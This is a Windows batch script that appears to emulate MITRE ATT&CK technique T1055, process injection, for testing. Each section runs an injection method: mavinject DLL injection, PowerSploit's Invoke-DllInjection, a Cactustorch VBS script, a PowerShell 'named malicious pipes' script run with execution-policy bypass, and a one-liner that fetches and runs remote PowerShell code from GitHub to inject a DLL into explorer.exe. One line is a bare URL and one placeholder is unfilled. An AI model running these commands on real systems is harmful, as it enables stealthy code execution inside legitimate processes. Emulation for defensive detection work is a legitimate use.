@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Process Injection (T1055)
ECHO.
ECHO [+] Using 'mavinject'
ECHO -------------------------------------------------------------------
mavinject $pid /INJECTRUNNING %PAYLOAD%T1055\src\x64\T1055.dll
https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-DllInjection.ps1
Invoke-DllInjection.ps1 -ProcessID #{process_id} -Dll T1055.dll
ECHO.
ECHO [+] Using 'Cactustorch'
ECHO -------------------------------------------------------------------
wscript %PAYLOAD%T1055\src\Process_Injection.vbs
ECHO.

ECHO [+] Named Malicious Pipes
ECHO -------------------------------------------------------------------
powershell -ep bypass %PAYLOAD%\T1055\src\named_malicious_pipes.ps1
ECHO.

ECHO [+] Named Malicious Pipes
ECHO -------------------------------------------------------------------
for /f "tokens=2" %%a in ('tasklist^|find /i "explorer"') do (set pid=%%a)
echo %PID%
cmd.exe /c powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rajrakeshdr/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1'); $m = Invoke-DllInjection -ProcessID %PID% -Dll %Utilities%Dll1_64.dll; $m
ECHO.
